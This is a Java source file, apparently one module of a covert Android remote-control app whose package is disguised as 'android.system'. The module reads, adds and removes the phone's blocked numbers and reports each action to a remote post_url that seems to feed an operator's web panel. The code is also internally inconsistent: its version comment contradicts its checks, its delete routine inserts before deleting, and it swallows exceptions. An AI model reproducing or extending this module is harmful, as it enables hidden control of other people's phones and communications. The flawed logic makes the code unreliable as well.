package oom.android.system.Managers;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION_CODES;
import android.provider.BlockedNumberContract;
import android.util.Log;

import androidx.annotation.RequiresApi;

import org.json.JSONArray;
import org.json.JSONObject;

import oom.android.system.app.HttpPoster;
import oom.android.system.app.MyService;

import static android.os.Build.VERSION.SDK_INT;
import static android.os.Build.VERSION_CODES.*;

public class BlockManager {
    //WORK ONLY ANDROID < 7.0
    public static JSONObject getBlockList(){
        try {
            JSONObject BlockList = new JSONObject();
            JSONArray list = new JSONArray();

            Cursor c = null;
            if (SDK_INT >= N) {
                c = MyService.getContext().getContentResolver().query(BlockedNumberContract.BlockedNumbers.CONTENT_URI,
                        new String[]{BlockedNumberContract.BlockedNumbers.COLUMN_ID, BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER,
                                BlockedNumberContract.BlockedNumbers.COLUMN_E164_NUMBER}, null, null, null);
            }

            while (c.moveToNext()){
                JSONObject blocks = new JSONObject();
                String number = c.getString(c.getColumnIndex(BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER));
                String id = c.getString(c.getColumnIndex(BlockedNumberContract.BlockedNumbers.COLUMN_ID));
                blocks.put("id",id);
                blocks.put("phoneNumber",number);
                list.put(blocks);
            }
            BlockList.put("blockList", list);
            Log.e("done" ,"collecting");
            c.close();
            Runnable uploader = new HttpPoster(MyService.post_url,"[Block]Список обновлён (нажмите Ctrl +f5)");
            new Thread(uploader).start();
            return BlockList;
        }catch (Exception e){}
        Runnable uploader = new HttpPoster(MyService.post_url,"[Block]Работает только на версиях выше 6.0");
        new Thread(uploader).start();
        return null;

    }



    public static void addBlock(String number){
        try {
            ContentResolver resolver = MyService.getContext().getContentResolver();
            ContentValues values = new ContentValues();
            values.put(BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER, number);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                Uri uri = resolver.insert(BlockedNumberContract.BlockedNumbers.CONTENT_URI, values);
                Runnable uploader = new HttpPoster(MyService.post_url,"[Block]Номер добавлен в черный список");
                new Thread(uploader).start();
            }


        }catch (Exception e){}
    }


    public static void DelBlock(String number){
        try {
            ContentResolver resolver = MyService.getContext().getContentResolver();
            ContentValues values = new ContentValues();
            values.put(BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER, number);
            Uri uri = null;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                uri = resolver.insert(BlockedNumberContract.BlockedNumbers.CONTENT_URI, values);
                Runnable uploader = new HttpPoster(MyService.post_url,"[Block]Номер удалён из черного списка");
                new Thread(uploader).start();
            }
            resolver.delete(uri, null, null);
        }catch (Exception e){}
    }
}
